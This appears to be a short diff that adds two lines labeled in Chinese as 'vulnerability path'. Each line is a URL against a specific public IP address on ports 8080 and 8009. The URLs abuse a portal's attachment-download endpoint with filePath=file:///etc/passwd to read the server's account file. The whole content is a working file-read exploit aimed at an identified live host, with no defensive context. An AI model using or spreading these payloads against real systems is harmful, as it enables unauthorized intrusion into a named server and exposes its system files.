@@ -1,0 +1,2 @@
+漏洞路径 http://117.156.80.37:8080/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+漏洞路径 http://117.156.80.37:8009/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
